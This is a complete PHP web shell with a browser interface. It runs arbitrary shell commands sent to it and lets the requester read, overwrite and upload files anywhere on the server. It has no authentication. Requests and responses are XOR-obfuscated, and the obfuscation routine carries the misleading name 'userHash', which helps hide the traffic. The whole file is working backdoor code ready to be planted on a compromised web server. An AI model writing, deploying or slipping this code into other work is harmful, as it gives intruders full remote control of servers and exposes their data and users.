<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ob_start();

$rawRequest = file_get_contents("php://input");
$request = $rawRequest ? json_decode(userHash($rawRequest)) : null;

runCommand($request);
openFile($request);
saveFile($request);
uploadFile($request);

function userHash($str) {
    $key = 'key';
    $result = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $tmp = $str[$i];
        for ($j = 0; $j < strlen($key); $j++) {
            $tmp = chr(ord($tmp) ^ ord($key[$j]));
        }
        $result .= $tmp;
    }
    return $result;
}

function renderResponse($data = [])
{
    $data['error'] = ob_get_contents();
    ob_end_clean();
    echo userHash(json_encode($data));
    die;
}

function runCommand($request)
{
    if (!empty($request->cmd)) {
        renderResponse(['data' => shell_exec($request->cmd)]);
    }
}

function openFile($request)
{
    if (!empty($request->action) && $request->action === 'openFile') {
        $fileContent = html_entity_decode(file_get_contents($request->name));
        renderResponse(['data' => $fileContent]);
    }
}

function saveFile($request)
{
    if (!empty($request->action) && $request->action === 'saveFile') {
        $fileContent = decodeBase64($request->fileContent);
        if (file_put_contents($request->filename, $fileContent)) {
            renderResponse(['data' => 'File was created']);
        } else {
            echo 'Can\'t save file content';
            renderResponse();
        }
    }
}

function uploadFile($request)
{
    if (!empty($request->action) && $request->action === 'uploadFile') {
        $fileContent = decodeBase64($request->fileContent);
        file_put_contents($request->fileDestination, $fileContent);
        renderResponse();
    }
}

function decodeBase64($rawData)
{
    $fileContent = substr($rawData, strpos($rawData, 'base64,') + 7);
    return base64_decode($fileContent);
}
?>
<style>
    * {
        font-family: monospace;
        /*background-color: #3f3f3f;
        color: #98e7f4;*/
    }
    textarea {
        width: 100%;
        display: block;
        unicode-bidi: embed;
        white-space: pre;
    }
    input[type=text] {
        width: 100%;
    }
    h3 {
        border-top: 2px solid #999;
        border-bottom: 2px solid #999;
    }
    label {
        display: block;
    }
</style>
<label>status
<textarea readonly id="errorLog" rows="5"></textarea>
</label>
<div>
    <button onclick="selectTab('cmd')">cmd</button>
    <button onclick="selectTab('fs')">file edit</button>
    <button onclick="selectTab('misc')">misc</button>
</div>
<div id="cmd" class="tab">
    <h3>cmd</h3>
    <p>
    <label>cmd
        <textarea id="cmdText">pwd; ls -al</textarea>
    </label>
    <input type="button" value="run" id="runCommand">
    <label>output
        <textarea readonly rows="20" id="cmdResult"></textarea>
    </label>
    </p>
</div>

<div id="fs" class="tab" style="display:none">
    <h3>file system</h3>
    <p>
    <fieldset>
        <legend>File view/edit</legend>
        <label>file path
            <input type="text" id="edFileName">
        </label>
        <label>file content
            <textarea rows="20" id="edFileContent"></textarea>
        </label>
        <input type="button" value="open" id="openFile">
        <input type="button" value="save" id="saveFile">
    </fieldset>
    <fieldset>
        <legend>File Upload</legend>
        <label>select file<input type="file" id="fileinput"></label>
        <label>destination path + file name<input type="text" id="fileDestination"></label>
        <button id="uploadButton">Upload</button>
    </fieldset>
    </p>
</div>

<div id="misc" class="tab" style="display:none">
    <h3>misc</h3>
    <p>To be implemented</p>
</div>
<script>
    function xor_this(str)
    {
        let key = "key";
        let xor = "";
        for (let i = 0; i < str.length; ++i) {
            let tmp = str[i];
            for (let j = 0; j < key.length; ++j) {
                tmp = String.fromCharCode(tmp.charCodeAt(0) ^ key.charCodeAt(j));
            }
            xor += tmp;
        }
        return xor;
    }
    document.getElementById("runCommand").onclick = function (ev) {
        let data = {
            "cmd": document.getElementById("cmdText").value
        };
        postData(data).then((value) => {
            document.getElementById("cmdResult").value = value;
        });
        return false;
    };
    document.getElementById("openFile").onclick = function (ev) {
        let data = {
            "action": "openFile",
            "name": document.getElementById("edFileName").value
        };
        postData(data).then((value) => {
            document.getElementById("edFileContent").value = value;
        });
        return false;
    };
    document.getElementById("saveFile").onclick = function (ev) {
        let reader = new FileReader();
        reader.onload = () => {
            let data = {
                "action": "saveFile",
                "fileContent": reader.result,
                "filename": document.getElementById("edFileName").value
            };
            console.log(data);
            postData(data).then((value) => {
                alert('saved');
            });
        };
        reader.readAsDataURL(new Blob(
            [document.getElementById("edFileContent").value],
            {
                type: 'text/plain'
            }
        ));
        return false;
    };
    document.getElementById("uploadButton").onclick = function (ev) {
        if (!document.getElementById("fileinput").files) {
            alert('no file selected');
            return false;
        }
        let reader = new FileReader();
        reader.onload = () => {
            let data = {
                "action": "uploadFile",
                "fileContent": reader.result,
                "fileDestination": document.getElementById("fileDestination").value
            };
            console.log(data);
            postData(data).then((value) => {
                alert('saved');
            });
        };
        reader.readAsDataURL(document.getElementById("fileinput").files[0]);

        return false;
    };

    function postData(data = {}, url = ``) {
        const jsonData = JSON.stringify(data);
        return fetch(url, {
            method: "POST",
            mode: "cors",
            cache: "no-cache",
            credentials: "same-origin",
            headers: {
                "Content-Type": "application/json; charset=utf-8"
            },
            redirect: "error",
            referrer: "no-referrer",
            body: xor_this(jsonData),
        })
            .then(
                response => response.body.getReader().read().then(({ done, value }) => {
                    let response = JSON.parse(xor_this(new TextDecoder("utf-8").decode(value)));
                    document.getElementById("errorLog").value = response.error ? response.error : 'OK ' + Date.now();
                    return response.data;
                })
            );
    }

    function selectTab(tabName) {
        let i;
        let x = document.getElementsByClassName("tab");
        for (i = 0; i < x.length; i++) {
            x[i].style.display = "none";
        }
        document.getElementById(tabName).style.display = "block";
    }
</script>